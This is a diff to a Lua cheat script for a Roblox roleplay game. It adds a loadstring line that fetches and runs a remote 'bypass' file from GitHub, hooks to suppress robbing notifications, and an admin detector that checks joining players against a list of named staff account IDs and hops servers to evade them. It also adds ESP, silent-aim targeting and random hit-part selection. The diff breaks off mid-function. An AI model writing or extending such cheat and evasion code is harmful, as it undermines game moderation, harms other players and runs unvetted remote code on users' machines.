@@ -1,11 +1,22 @@
+if not getgenv().BYPASS_LOADED then
+    local success, err = pcall(function()
+        loadstring(game:HttpGet("https://raw.githubusercontent.com/Tagger83/BYPASSs.lua/refs/heads/main/bs.lua"))()
+    end)
+    if success then
+        getgenv().BYPASS_LOADED = true
+    else
+        warn("Bypass failed to load: " .. tostring(err))
+    end
+end
+
 -- [ SVC ]
 local ENV = { S = setmetatable({}, { __index = function(_, k) return game:GetService(k) end }) }
 ENV.P, ENV.T, ENV.U, ENV.C, ENV.RS, ENV.RC = ENV.S.Players, ENV.S.TweenService, ENV.S.UserInputService, ENV.S.CoreGui,
     ENV.S.RunService, ENV.S.ReplicatedStorage
 local PLRS, TS, UIS, CORE, RS, RS_CAR = ENV.P, ENV.T, ENV.U, ENV.C, ENV.RS, ENV.RC
 local LPLR = PLRS.LocalPlayer
-local TARGET_ID = 111492135141809
-local MAIN_ID = 125710131917702
+local TARGET_ID = 121567535120062
+local MAIN_ID = 121567535120062
 
 
 local IS_MOBILE = UIS.TouchEnabled and not UIS.KeyboardEnabled
@@ -29,7 +40,7 @@ if _G.CENTRAL_LOADED then
         OLD.Enabled = true
         pcall(function()
             if _G.NOTIFY then
-                _G.NOTIFY("Security", "Script already running!", 3)
+                _G.NOTIFY("Security", "Script already running! Restored Visibility.", 3)
             else
                 warn("NYH: Already Loaded!")
             end
@@ -43,6 +54,29 @@ end
 _G.CENTRAL_LOADED = true
 _G.EXE = _G.EXE or {}
 local E = _G.EXE
+
+-- [ NOTIFICATION SUPPRESSION ]
+task.spawn(function()
+    local rep = game:GetService("ReplicatedStorage")
+    local inst = rep:WaitForChild("Instancers", 10)
+    local notifScript = inst and inst:WaitForChild("Notification", 10)
+    if notifScript then
+        local success, Notification = pcall(function()
+            return require(notifScript)
+        end)
+        if success and typeof(Notification) == "table" then
+            local oldInit = Notification.Init
+            if oldInit then
+                Notification.Init = function(self, data, ...)
+                    if typeof(data) == "table" and (data.Title == "Robbing" or tostring(data.Title):find("Rob")) then
+                        return -- Block robbing notifications
+                    end
+                    return oldInit(self, data, ...)
+                end
+            end
+        end
+    end
+end)
 E.FARM_RUNNING = (E.FARM_RUNNING ~= nil) and E.FARM_RUNNING or false
 E.BYPASS_CARS_ON = (E.BYPASS_CARS_ON ~= nil) and E.BYPASS_CARS_ON or false
 E.TP_METHOD = E.TP_METHOD or "Classic"
@@ -60,7 +94,7 @@ E.GUN_MODS = E.GUN_MODS or {
     CarFly = false,
     CarFlySpeed = 150
 }
-E.SECURITY = E.SECURITY or { AdminDetector = true, AutoLeave = false }
+E.SECURITY = E.SECURITY or { AdminDetector = false, AutoLeave = false }
 E.AUTO_ARMOR = (E.AUTO_ARMOR ~= nil) and E.AUTO_ARMOR or false
 E.AUTO_ARMOR_THRESHOLD = E.AUTO_ARMOR_THRESHOLD or 20
 
@@ -151,201 +185,150 @@ task.spawn(function()
     end
 end)
 
--- [ GUN MODS BACKGROUND LOOPS ]
 
--- 1. Infinite Ammo (RenderStepped for maximum responsiveness)
-task.spawn(function()
-    RS.RenderStepped:Connect(function()
-        if not _G.EXE.GUN_MODS.InfAmmo then return end
-
-        local stats = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData") and
-            game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(LPLR.Name) and
-            game:GetService("ReplicatedStorage").PlayerData[LPLR.Name]:FindFirstChild("Statistics")
-        if stats then
-            local ammoLight  = stats:FindFirstChild("AmmoLight")
-            local ammoMedium = stats:FindFirstChild("AmmoMedium")
-            local ammoHeavy  = stats:FindFirstChild("AmmoHeavy")
-
-            if ammoLight and ammoLight.Value < 500 then ammoLight.Value = 9999 end
-            if ammoMedium and ammoMedium.Value < 500 then ammoMedium.Value = 9999 end
-            if ammoHeavy and ammoHeavy.Value < 500 then ammoHeavy.Value = 9999 end
-        end
-
-        local char = LPLR.Character
-        local backpack = LPLR:FindFirstChild("Backpack")
-
-        for _, parent in ipairs({ char, backpack }) do
-            if parent then
-                for _, tool in ipairs(parent:GetChildren()) do
-                    if tool:IsA("Tool") then
-                        local vf = tool:FindFirstChild("ValueFolder")
-                        if vf then
-                            for _, slot in ipairs(vf:GetChildren()) do
-                                local ammoVal = slot:FindFirstChild("Ammo")
-                                local magVal  = slot:FindFirstChild("Mag")
-                                if ammoVal and ammoVal.Value < 500 then ammoVal.Value = 9999 end
-                                if magVal and magVal.Value < 5 then magVal.Value = 999 end
-                            end
-                        end
-                    end
-                end
-            end
-        end
-    end)
-end)
-
--- 2. No Recoil & Rapid Fire (Heartbeat)
-task.spawn(function()
-    local lastTool = nil
-
-    RS.Heartbeat:Connect(function()
-        -- [ NO RECOIL LOGIC ]
-        local stats = game:GetService("ReplicatedStorage"):FindFirstChild("PlayerData") and
-            game:GetService("ReplicatedStorage").PlayerData:FindFirstChild(LPLR.Name) and
-            game:GetService("ReplicatedStorage").PlayerData[LPLR.Name]:FindFirstChild("Statistics")
-        if stats then
-            local dex = stats:FindFirstChild("Dexterity")
-            if dex then
-                if _G.EXE.GUN_MODS.NoRecoil then
-                    if not _G.EXE.GUN_MODS.OriginalDex then
-                        _G.EXE.GUN_MODS.OriginalDex = dex.Value
-                    end
-                    if dex.Value < 9999999 then
-                        dex.Value = 9999999999999
-                    end
-                else
-                    if _G.EXE.GUN_MODS.OriginalDex then
-                        dex.Value = _G.EXE.GUN_MODS.OriginalDex
-                        _G.EXE.GUN_MODS.OriginalDex = nil
-                    end
-                end
-            end
-        end
-
-        -- [ RAPID FIRE LOGIC ]
-        if _G.EXE.GUN_MODS.RapidFire then
-            local char = LPLR.Character
-            local tool = char and char:FindFirstChildOfClass("Tool")
-            if tool and tool ~= lastTool then
-                local is_red = tool.Name:find("^!!") -- Ignorar gamepasses si es necesario, pero el script del usuario no lo hace
-                lastTool = tool
-                task.wait(0.1)
-                tool:SetAttribute("Switch", true)
-                tool:SetAttribute("SwiftLink", true)
-                tool:SetAttribute("BinaryTrigger", false)
-                tool:SetAttribute("Beam", true)
-            end
-        else
-            lastTool = nil
-        end
-    end)
-end)
 
 -- [ ADMIN DETECTOR ]
 local STAFF_LIST = {
-    [43902325]   = "trapfinesse",         -- Nelly
-    [2486772980] = "DeeBIockDuke",        -- (-)
-    [4590380163] = "RoadToTheRichesGame", -- (-)
-    [1102415403] = "ra36o",               -- Super Administrator
-    [2427534513] = "GuapoFujii",          -- Super Administrator
-    [97001308]   = "kwengfigures",        -- Super Administrator
-    [2647480702] = "vzperknow",           -- Administrator
-    [367792282]  = "getcraftywitg2c",     -- Administrator
-    [5763126198] = "embaudie",            -- Administrator
-    [3212889592] = "Gramtas",             -- Moderator
-    [5158788093] = "Jboogie184",          -- Moderator
-    [1732466193] = "K1_R9",               -- Moderator
-    [417996265]  = "qjow",                -- Moderator
-    [7181815530] = "Byrbuell",            -- Moderator
-    [162117777]  = "Siegifys",            -- Moderator
-    [4220213023] = "ScreensRB",           -- Content Creator (High)
-    [1196871048] = "faithfulIll",         -- Content Creator (High)
-    [2728457005] = "notmwadd",            -- Content Creator (High)
-    [341726375]  = "2xDotti",             -- Content Creator (High)
-    [559010993]  = "King_Monkey212",      -- Content Creator (High)
-    [8045266315] = "babysemi2x_YT",       -- Content Creator (High)
-    [2540788874] = "MrFoenem600",         -- Content Creator (High)
-    [2477202393] = "SacredSeo",           -- Content Creator (High)
-    [5280547150] = "WhoGotSprinkles",     -- Content Creator (High)
-    [3964675857] = "YLeo5523",            -- Content Creator (High)
-    [1198328332] = "deezdaiy",            -- Content Creator (High)
-    [2477120960] = "finesseLaw",          -- Content Creator (High)
-    [3282780062] = "Sir_Trixy",           -- Content Creator (Low)
-    [3966145539] = "Squareman2235689",    -- Content Creator (Low)
-    [3947511166] = "REALDAYGOBABY",       -- Content Creator (Low)
-    [328070038]  = "hearmeorblind",       -- Content Creator (Low)
-    [6014422591] = "AOS_ZAYNEM",          -- Content Creator (Low)
-    [5430204147] = "50greedy"             -- Content Creator (Low)
+    [1257073083] = "HighDispersion",
+    [491881629]  = "MrFrosty",
+    [7821897977] = "RGn",
+    [429393318]  = "NixfrmCBK",
+    [1462158335] = "Crxcii",
+    [5116099657] = "CBKRxRTJ",
+    [2520899372] = "Zay_3RS",
+    [369304050]  = "KitTakaTeeFrmCBK",
+    [101782189]  = "コール",
+    [443186070]  = "Jimm",
+    [5494980700] = "LLTrapp57",
+    [8589713339] = "I0PP3",
+    [948985163]  = "khi",
+    [7203561836] = "ITSMYFAULT",
+    [1748679794] = "WAZE",
+    [222638640]  = "landooo",
+    [167307509]  = "1301MG MainTap",
+    [5090858991] = "trey",
+    [33540477]   = "Yuke",
+    [1702548443] = "Xlym",
+    [99984265]   = "Ishan",
+    [1781883503] = "Pulledupinnafuto",
+    [8162310250] = "OperationAJ",
+    [3106275464] = "wintrs",
+    [154943097]  = "tapp",
+    [2473529312] = "someone",
+    [4775061]    = "angelbaby12",
+    [7322940967] = "Glock47DrumBeam",
+    [167283473]  = "Valor",
+    [169641570]  = "toooher",
+    [6219914993] = "VON",
+    [7270095233] = "jaywaymoneyway1",
+    [193675379]  = "OperationDev"
 }
 
-local DANGEROUS_RANKS = {
-    [255] = true, -- Nelly
-    [254] = true, -- (-)
-    [253] = true, -- Super Administrator
-    [251] = true, -- Administrator
-    [250] = true, -- Moderator
-    [240] = true, -- Content Creator (High)
-    [239] = true, -- Content Creator (Low)
+local AdminIDs = {
+    [193675379] = "Owner",
+    [7270095233] = "Admin",
+    [6219914993] = "Admin",
+    [169641570] = "Admin",
+    [167283473] = "Admin",
+    [7322940967] = "Admin",
+    [4775061] = "Admin",
+    [2473529312] = "Admin",
+    [154943097] = "Admin",
+    [8162310250] = "Admin",
+    [3106275464] = "Analytics",
+    [1748679794] = "Tester",
+    [443186070] = "Tester",
+    [2520899372] = "Tester",
+    [429393318] = "Tester",
+    [8469523389] = "Tester",
+    [1257073083] = "Contributor"
 }
+
+-- Mantenemos los antiguos también por si acaso
+for id, rank in pairs(STAFF_LIST) do
+    if not AdminIDs[id] then
+        AdminIDs[id] = rank
+    end
+end
+
+local function KickPlayer()
+    LPLR:Kick("Admin detected! Changing server...")
+    task.wait(2)
+
+    local HttpService = game:GetService("HttpService")
+    local TeleportService = game:GetService("TeleportService")
+    local PlaceId = game.PlaceId
+    local url = "https://games.roblox.com/v1/games/" ..
+        tostring(PlaceId) .. "/servers/Public?sortOrder=Asc&limit=100"
+
+    local function getServers(c)
+        local u = c and (url .. "&cursor=" .. c) or url
+        local s, r = pcall(function() return HttpService:JSONDecode(game:HttpGet(u)) end)
+        return (s and r and r.data) and r or nil
+    end
+
+    local serverToHop, cursor = nil, nil
+    while not serverToHop do
+        local data = getServers(cursor)
+        if data and data.data then
+            for _, sv in ipairs(data.data) do
+                if type(sv) == "table" and sv.id ~= game.JobId and sv.playing and sv.playing < sv.maxPlayers - 1 then
+                    serverToHop = sv.id
+                    break
+                end
+            end
+            cursor = data.nextPageCursor
+            if not cursor then break end
+        else
+            break
+        end
+    end
+
+    if serverToHop then
+        TeleportService:TeleportToPlaceInstance(PlaceId, serverToHop, LPLR)
+    else
+        TeleportService:Teleport(PlaceId, LPLR)
+    end
+end
 
 local function checkAdmin(player)
-    if STAFF_LIST[player.UserId] then return true end
+    if AdminIDs[player.UserId] then return true end
     if player.UserId == game.CreatorId then return true end
-    local isAdm = false
-    pcall(function()
-        local rank = player:GetRankInGroup(10725131)
-        if DANGEROUS_RANKS[rank] then isAdm = true end
-    end)
-    return isAdm
+
+    local s1, rank = pcall(function() return player:GetRankInGroup(35381445) end)
+    if s1 and type(rank) == "number" and rank > 0 then return true end
+
+    local s2, inGroup = pcall(function() return player:IsInGroup(1200769) end)
+    if s2 and type(inGroup) == "boolean" and inGroup then return true end
+
+    return false
 end
 
 local function onAdminDetected(player)
     if not _G.EXE.SECURITY.AdminDetector then return end
-    if _G.NOTIFY then
-        _G.NOTIFY("SECURITY", "ADMIN DETECTED: " .. player.Name .. " (" .. player.UserId .. ")", 15)
-    end
+    NOTIFY("SECURITY", "ADMIN DETECTED: " .. player.Name .. " (" .. player.UserId .. ")", 15)
     warn("[SECURITY] Admin Detected: " .. player.Name)
 
     if _G.EXE.SECURITY.AutoLeave then
-        -- Fallback garantizado: pase lo que pase, en 1.5s sale del juego
-        task.delay(1.5, function()
-            pcall(function()
-                game:GetService("TeleportService"):Teleport(125710131917702, LPLR)
-            end)
-            task.wait(0.5)
-            LPLR:Kick("Admin Detected: " .. player.Name .. " (Emergency Leave)")
-        end)
-
         task.wait(0.5)
-        pcall(function()
-            local rs = game:GetService("ReplicatedStorage")
-            local remotes = rs:FindFirstChild("RemoteEvents")
-            local lobby = remotes and remotes:FindFirstChild("Lobby")
-            if lobby then
-                lobby:InvokeServer()
-            end
-        end)
+        KickPlayer()
     end
 end
 
-local alertedAdmins = {}
 task.spawn(function()
-    while task.wait(3) do
-        if _G.EXE and _G.EXE.SECURITY and _G.EXE.SECURITY.AdminDetector then
-            for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
-                if p ~= LPLR then
-                    if alertedAdmins[p.UserId] then
-                        if _G.EXE.SECURITY.AutoLeave then
-                            task.spawn(onAdminDetected, p)
-                        end
-                    elseif checkAdmin(p) then
-                        alertedAdmins[p.UserId] = true
-                        task.spawn(onAdminDetected, p)
-                    end
-                end
-            end
+    -- Initial Scan
+    for _, p in ipairs(game:GetService("Players"):GetPlayers()) do
+        if p ~= LPLR and checkAdmin(p) then
+            onAdminDetected(p)
         end
     end
+
+    -- Real-time Scan
+    game:GetService("Players").PlayerAdded:Connect(function(p)
+        if checkAdmin(p) then
+            onAdminDetected(p)
+        end
+    end)
 end)
 
 -- [ DIRECT TP ]
@@ -554,22 +537,40 @@ local CurFontName            = "GothamBold"
 local ActiveFont             = Enum.Font.GothamBold -- fuente activa global, usada por NOTIFY y otros
 local CurBGId                = CFG.IMG
 local CurBGTrans             = 0.8
+local CurSidebarTabs         = false
+local CurSmoothDrag          = false
+local CurSizeX               = 700
+local CurSizeY               = 565
 
 local function SAVE_CONFIG()
     local data = {
-        CustomBG = CurBGId,
-        BG_Trans = CurBGTrans,
-        Keybind  = tostring(CFG.KEY)
+        CustomBG    = CurBGId,
+        BG_Trans    = CurBGTrans,
+        Keybind     = tostring(CFG.KEY),
+        SidebarTabs = CurSidebarTabs,
+        SmoothDrag  = CurSmoothDrag,
+        Theme       = CurThemeName,
+        Font        = CurFontName,
+        SizeX       = CurSizeX,
+        SizeY       = CurSizeY
     }
     pcall(function()
-        writefile("NYH_Config.json", HttpService:JSONEncode(data))
+        if writefile and HttpService then
+            writefile("CTS_Config.json", HttpService:JSONEncode(data))
+        end
     end)
 end
 
 local function LOAD_CONFIG()
-    if isfile("NYH_Config.json") then
+    local has_file = false
+    pcall(function()
+        if isfile and isfile("CTS_Config.json") then
+            has_file = true
+        end
+    end)
+    if has_file then
         local success, data = pcall(function()
-            return HttpService:JSONDecode(readfile("NYH_Config.json"))
+            return HttpService:JSONDecode(readfile("CTS_Config.json"))
         end)
         if success and data then
             if data.CustomBG then
@@ -584,11 +585,31 @@ local function LOAD_CONFIG()
                     CFG.KEY = Enum.KeyCode[k]
                 end)
             end
+            if data.SidebarTabs ~= nil then
+                CurSidebarTabs = data.SidebarTabs
+            end
+            if data.SmoothDrag ~= nil then
+                CurSmoothDrag = data.SmoothDrag
+            end
+            if data.Theme then
+                CurThemeName = data.Theme
+            end
+            if data.Font then
+                CurFontName = data.Font
+            end
+            if data.SizeX then
+                CurSizeX = data.SizeX
+            end
+            if data.SizeY then
+                CurSizeY = data.SizeY
+            end
         end
     end
 end
 
 
+
+local REF_UPDATE_TABS
 
 LOAD_CONFIG()
 
@@ -680,6 +701,9 @@ local function APPLY_THEME(themeName)
             end
         end
     end
+    if REF_UPDATE_TABS then
+        REF_UPDATE_TABS()
+    end
 end
 
 
@@ -697,11 +721,13 @@ local function APPLY_FONT_UI(enumFont)
     if not scr then return end
     for _, obj in ipairs(scr:GetDescendants()) do
         if obj:IsA("TextLabel") or obj:IsA("TextButton") or obj:IsA("TextBox") then
-            if typeof(enumFont) == "Font" then
-                obj.FontFace = enumFont
-            else
-                obj.Font = enumFont
-            end
+            pcall(function()
+                if typeof(enumFont) == "Font" then
+                    obj.FontFace = enumFont
+                else
+                    obj.Font = enumFont
+                end
+            end)
         end
     end
 end
@@ -969,8 +995,12 @@ local function NOTIFY(TITLE, MSG, TIME)
     end
 
     -- [ PREMIUM NOTIF FRAME ]
+    local isMultiline = MSG:find("\n")
+    local frmHeight = isMultiline and 68 or 52
+    local msgHeight = isMultiline and 36 or 20
+
     local FRM = Instance.new("Frame", HOLDER)
-    FRM.Size = UDim2.new(1, 0, 0, 52)
+    FRM.Size = UDim2.new(1, 0, 0, frmHeight)
     FRM.BackgroundColor3 = Color3.fromRGB(20, 20, 25)
     FRM.BackgroundTransparency = 1
     FRM.BorderSizePixel = 0
@@ -1018,7 +1048,7 @@ local function NOTIFY(TITLE, MSG, TIME)
 
     local M = Instance.new("TextLabel", FRM)
     M.Text = MSG
-    M.Size = UDim2.new(1, -30, 0, 20)
+    M.Size = UDim2.new(1, -30, 0, msgHeight)
     M.Position = UDim2.new(0, 12, 0, 20)
     M.BackgroundTransparency = 1
     M.TextColor3 = Color3.new(1, 1, 1)
@@ -1074,7 +1104,6 @@ local function NOTIFY(TITLE, MSG, TIME)
         FRM:Destroy()
     end)
 end
-_G.NOTIFY = NOTIFY
 
 
 
@@ -1270,7 +1299,8 @@ local function ADD_DRP(PAG, TTL, CB)
         local is_red = text:find("^!!")
         local t_norm = is_red and text:gsub("!!", "") or text
         local is_sep = t_norm:find("^—") or t_norm:find("^%-")
-        local ITM = Instance.new("TextButton", SCR)
+
+        local ITM = Instance.new("TextButton")
         ITM.Name = is_sep and "Separator" or "DropItem"
         ITM.Size = UDim2.new(1, 0, 0, is_sep and 25 or 30)
         ITM.BackgroundTransparency = 1
@@ -1281,6 +1311,7 @@ local function ADD_DRP(PAG, TTL, CB)
         ITM.TextXAlignment = is_sep and Enum.TextXAlignment.Center or Enum.TextXAlignment.Left
         ITM.ZIndex = 7
         ITM.AutoButtonColor = not is_sep
+        ITM.Parent = SCR
 
         if not is_sep then
             ITM.MouseEnter:Connect(function() TWN(ITM, { TextColor3 = CFG.COL.ACC }, 0.1) end)
@@ -1304,12 +1335,14 @@ local function ADD_DRP(PAG, TTL, CB)
         local LST = type(arg1) == "table" and (arg1.ADD and arg2 or arg1) or arg1
         if type(LST) ~= "table" then return end
 
-        for _, C in pairs(SCR:GetChildren()) do
-            if C.Name == "DropItem" then C:Destroy() end
-        end
-        for _, P in pairs(LST) do
-            ADD_ITEM(nil, P)
-        end
+        pcall(function()
+            for _, C in pairs(SCR:GetChildren()) do
+                if C.Name == "DropItem" then C:Destroy() end
+            end
+            for _, P in pairs(LST) do
+                ADD_ITEM(nil, P)
+            end
+        end)
     end
 
     BTN.MouseButton1Click:Connect(function()
@@ -1336,7 +1369,11 @@ local function ADD_DRP(PAG, TTL, CB)
         return self
     end
 
-    return { FRM = FRM, SCR = SCR, ADD = ADD_ITEM, REFRESH = RFSH, ADD_MANY = ADD_MANY }
+    local function RESET_TEXT()
+        BTN.Text = "  " .. (prefix and (prefix .. ": " .. initial_val) or TTL)
+    end
+
+    return { FRM = FRM, SCR = SCR, ADD = ADD_ITEM, REFRESH = RFSH, ADD_MANY = ADD_MANY, RESET = RESET_TEXT }
 end
 
 local function ADD_TGL(PAG, TXT, DEF, CB)
@@ -1392,6 +1429,7 @@ local function ADD_TGL(PAG, TXT, DEF, CB)
         UPD(not run_cb)
     end
 
+    TGL.FRM = FRM
     return TGL
 end
 
@@ -1792,81 +1830,118 @@ local R6_BONES = {
     { "Head",  "Torso" }, { "Torso", "Left Arm" }, { "Torso", "Right Arm" },
     { "Torso", "Left Leg" }, { "Torso", "Right Leg" }
 }
-
 local function UPD_ESP()
-    for _, p in pairs(PLRS:GetPlayers()) do
+    local cam = workspace.CurrentCamera
+    local plrs = PLRS:GetPlayers()
+
+    -- Distancia inteligente para priorizar Rayos-X (Evita límite de 31 Highlights del motor)
+    table.sort(plrs, function(a, b)
+        local ca, cb = a.Character or workspace:FindFirstChild(a.Name), b.Character or workspace:FindFirstChild(b.Name)
+        local pa = ca and (ca:FindFirstChild("HumanoidRootPart") or ca:FindFirstChild("UpperTorso"))
+        local pb = cb and (cb:FindFirstChild("HumanoidRootPart") or cb:FindFirstChild("UpperTorso"))
+        local da = pa and (cam.CFrame.Position - pa.Position).Magnitude or 99999
+        local db = pb and (cam.CFrame.Position - pb.Position).Magnitude or 99999
+        return da < db
+    end)
+
+    local activeHL = 0
+
+    for _, p in ipairs(plrs) do
         pcall(function()
-            if p == LPLR then return end
+            local isLocalPlayer = (p == LPLR)
             local E = CACHE[p] or MK_ESP(p)
-            -- Buscar el char tanto en workspace (juego custom) como en p.Character (estándar)
-            local C = workspace:FindFirstChild(p.Name) or p.Character
 
-            -- Dynamic cleanup if character is missing
-            if not C or not C:FindFirstChild("HumanoidRootPart") then
-                if E.CHAM then
-                    E.CHAM:Destroy(); E.CHAM = nil
+            -- Búsquedas mejoradas NYC (UserId + Name)
+            local C = p.Character or workspace:FindFirstChild(p.Name)
+            if not C then
+                for _, obj in pairs(workspace:GetChildren()) do
+                    if obj:IsA("Model") and (obj.Name:find(tostring(p.UserId)) or obj.Name:find(p.Name)) then
+                        C = obj; break
+                    end
                 end
-                E.FRM.Visible = false
-                return
             end
 
-            local H         = C:FindFirstChild("HumanoidRootPart")
-            local HUM       = C:FindFirstChildOfClass("Humanoid")
+            if not C then
+                if E.CH_PARTS then
+                    for _, v in pairs(E.CH_PARTS) do pcall(function() v:Destroy() end) end; E.CH_PARTS = nil
+                end
+                E.FRM.Visible = false; return
+            end
 
-            -- Obtener salud: primero el NumberValue custom, luego Humanoid.Health
-            local healthVal = C:FindFirstChild("Health")
-            local curHP, maxHP
-            if healthVal and healthVal:IsA("NumberValue") then
-                curHP = healthVal.Value
-                maxHP = 100 -- valor por defecto para el juego custom
-                -- Intentar leer maxHealth del Humanoid si existe
-                if HUM then maxHP = HUM.MaxHealth > 0 and HUM.MaxHealth or 100 end
+            local H            = C:FindFirstChild("HumanoidRootPart") or C:FindFirstChild("Torso") or
+                C:FindFirstChild("UpperTorso")
+            local HUM          = C:FindFirstChildOfClass("Humanoid")
+
+            local curHP, maxHP = 100, 100
+            local hv           = C:FindFirstChild("Health")
+            if hv and hv:IsA("NumberValue") then
+                curHP = hv.Value
             elseif HUM then
-                curHP = HUM.Health
-                maxHP = HUM.MaxHealth > 0 and HUM.MaxHealth or 100
-            else
-                curHP = 0
-                maxHP = 100
-            end
-            local isAlive = curHP > 0
-
-            -- Chams Logic (Highly Optimized Caching)
-            if C and isAlive then
-                if ESP_CFG.Chams.Enabled then
-                    if not E.CHAM or E.CHAM.Parent ~= C then
-                        if E.CHAM then pcall(function() E.CHAM:Destroy() end) end
-                        E.CHAM = Instance.new("Highlight")
-                        E.CHAM.Name = "CEN_CHAM"
-                        E.CHAM.Adornee = C
-                        E.CHAM.Parent = C
-                        E.CHAM.DepthMode = Enum.HighlightDepthMode.AlwaysOnTop
-                    end
-
-                    local shield = C:FindFirstChild("ForceFieldSpawn") or C:FindFirstChild("ForceFieldGZ")
-
-                    if shield then
-                        E.CHAM.FillColor = Color3.new(1, 1, 1)
-                        E.CHAM.OutlineColor = Color3.new(1, 1, 1)
-                        E.CHAM.FillTransparency = 0.3 + math.sin(tick() * 25) * 0.4 -- Flash ultra rápido
-                        E.CHAM.OutlineTransparency = 0
-                    else
-                        E.CHAM.FillColor = ESP_CFG.Chams.Color1
-                        E.CHAM.OutlineColor = ESP_CFG.Chams.Color2
-                        E.CHAM.OutlineTransparency = 0
-                        E.CHAM.FillTransparency = 0.5
-                    end
-                elseif E.CHAM then
-                    E.CHAM:Destroy()
-                    E.CHAM = nil
-                end
-            else
-                if E.CHAM then
-                    E.CHAM:Destroy(); E.CHAM = nil
-                end
+                curHP = HUM.Health; maxHP = HUM.MaxHealth
             end
 
-            -- 2D Visuals Logic
-            if ESP_CFG.Enabled and H and isAlive then
+            -- En servidores RP (NYC), la vida nativa a veces se marca en 0 para ocultar la barra de Roblox.
+            -- Usamos el "Estado" del humanoide o asumimos que está vivo si sigue mapeado a Character.
+            local isAlive = true
+            if HUM and HUM:GetState() == Enum.HumanoidStateType.Dead then
+                isAlive = false
+            end
+
+
+            -- MOTOR DE CHAMS NYC (Autocamuflaje de Plasma - SOLO LOCALPLAYER)
+            if isLocalPlayer then
+                if ESP_CFG.Chams.Enabled and isAlive then
+                    E_SELF_ORIGINAL_MATS = E_SELF_ORIGINAL_MATS or {}
+
+                    -- Respiración Bicolor para Plasma (Ocupa ambos Color Pickers de la interfaz)
+                    local wave = (math.sin(tick() * 3.5) + 1) * 0.5
+                    local pulseColor = ESP_CFG.Chams.Color1:Lerp(ESP_CFG.Chams.Color2, wave)
+
+                    -- Limpiamos Ropa 3D y aplicamos Plasma Base
+                    for _, obj in ipairs(C:GetDescendants()) do
+                        if obj:IsA("BasePart") or obj:IsA("MeshPart") then
+                            if obj.Name ~= "HumanoidRootPart" and obj.Transparency < 1 and not obj:FindFirstAncestorOfClass("Tool") then
+                                local sa = obj:FindFirstChildOfClass("SurfaceAppearance")
+
+                                if not E_SELF_ORIGINAL_MATS[obj] then
+                                    E_SELF_ORIGINAL_MATS[obj] = {
+                                        Mat = obj.Material,
+                                        Col = obj.Color,
+                                        SA = sa,
+                                        Tr = obj.Transparency
+                                    }
+                                end
+
+                                if sa then sa.Parent = nil end
+
+                                obj.Material = Enum.Material.ForceField
+                                obj.Color = pulseColor
+                            end
+                        end
+                    end
+                else
+                    if E_SELF_ORIGINAL_MATS then
+                        for obj, data in pairs(E_SELF_ORIGINAL_MATS) do
+                            pcall(function()
+                                if obj and obj.Parent then
+                                    obj.Material = data.Mat
+                                    obj.Color = data.Col
+                                    obj.Transparency = data.Tr
+                                    if data.SA and data.SA.Parent ~= obj then
+                                        data.SA.Parent = obj
+                                    end
+                                end
+                            end)
+                        end
+                        E_SELF_ORIGINAL_MATS = nil
+                    end
+                end
+            end
+
+
+
+            -- 2D Visuals Logic (Exclusivo para Enemigos)
+            if ESP_CFG.Enabled and H and isAlive and not isLocalPlayer then
                 local cam = workspace.CurrentCamera
                 local pos, vis = cam:WorldToViewportPoint(H.Position)
                 local dist = (cam.CFrame.Position - H.Position).Magnitude
@@ -2312,9 +2387,21 @@ end
 
 local function GET_TARGET_PART(char, partName)
     if not char then return nil end
-    local part = char:FindFirstChild(partName or "HumanoidRootPart")
+    if partName == "Random" then
+        local validParts = {}
+        for _, v in ipairs(char:GetChildren()) do
+            if v:IsA("BasePart") then
+                table.insert(validParts, v)
+            end
+        end
+        if #validParts > 0 then
+            return validParts[math.random(1, #validParts)]
+        end
+    end
+
+    local part = char:FindFirstChild(partName or "Head")
     if part and part:IsA("BasePart") then return part end
-    local fallbacks = { "HumanoidRootPart", "Head", "UpperTorso", "LowerTorso" }
+    local fallbacks = { "Head", "HumanoidRootPart", "UpperTorso", "LowerTorso" }
     for _, name in ipairs(fallbacks) do
         local fb = char:FindFirstChild(name)
         if fb and fb:IsA("BasePart") then return fb end
@@ -2322,48 +2409,143 @@ local function GET_TARGET_PART(char, partName)
     return nil
 end
 
+local function VISIBLE_CHECK(targetPart)
+    if not targetPart then return false end
 
--- [ SILENT AIM MODULE HOOKING — DISABLED FOR COMPATIBILITY ]
---[[
-local ok, PH = pcall(require, game:GetService("ReplicatedStorage").Modules.ProjectileHandler)
-if ok and PH then
-    local originalSimulate = PH.SimulateProjectile
+    local camera = workspace.CurrentCamera
+    if not camera then return false end
 
-    PH.SimulateProjectile = function(self, gun, handle, settings, directions, firePoint, muzzle, vfx, visualize)
-        -- Si está habilitado, tenemos un Target, la tecla está pulsada (si la hay) y es tabla directions
-        if ESP_CFG.SilentAim.Enabled and SilentTarget and typeof(directions) == "table" and (not ESP_CFG.SilentAim.Keybind or UIS:IsKeyDown(ESP_CFG.SilentAim.Keybind)) then
-            local targetChar = SilentTarget.Character
-            local part = targetChar and (
-                targetChar:FindFirstChild("Head") or
-                targetChar:FindFirstChild("HumanoidRootPart")
-            )
+    local origin = camera.CFrame.Position
+    local direction = (targetPart.Position - origin)
 
-            if part then
-                local origin
-                if firePoint then
-                    pcall(function()
-                        if firePoint:IsA("Attachment") then
-                            origin = firePoint.WorldPosition
-                        elseif firePoint:IsA("BasePart") then
-                            origin = firePoint.Position
+    local params = RaycastParams.new()
+    params.FilterDescendantsInstances = { camera, LPLR.Character }
+    params.FilterType = Enum.RaycastFilterType.Exclude
+    params.IgnoreWater = true
+
+    -- Bypass __namecall to avoid infinite recursion
+    local result = workspace.Raycast(workspace, origin, direction, params)
+
+    if result then
+        if result.Instance:IsDescendantOf(targetPart.Parent) then
+            return true
+        end
+        return false
+    end
+    return true
+end
+
+local function GET_SILENT_TARGET()
+    local maxDist = _G.EXE.SILENT_AIM.FOV_Radius or 100
+    local closestTarget = nil
+
+    local ms = UIS:GetMouseLocation()
+    local mousePos = Vector2.new(ms.X, ms.Y)
+
+    local camera = workspace.CurrentCamera
+    if not camera then return nil end
+
+    for _, p in ipairs(PLRS:GetPlayers()) do
+        if p ~= LPLR then
+            local char = GET_CHAR(p)
+            if IS_ALIVE(char) then
+                local rootPart = char:FindFirstChild("HumanoidRootPart")
+                if rootPart then
+                    local screenPos, onScreen = camera:WorldToViewportPoint(rootPart.Position)
+
+                    if onScreen then
+                        local dist = (Vector2.new(screenPos.X, screenPos.Y) - mousePos).Magnitude
+
+                        if dist < maxDist then
+                            if _G.EXE.SILENT_AIM.WallCheck then
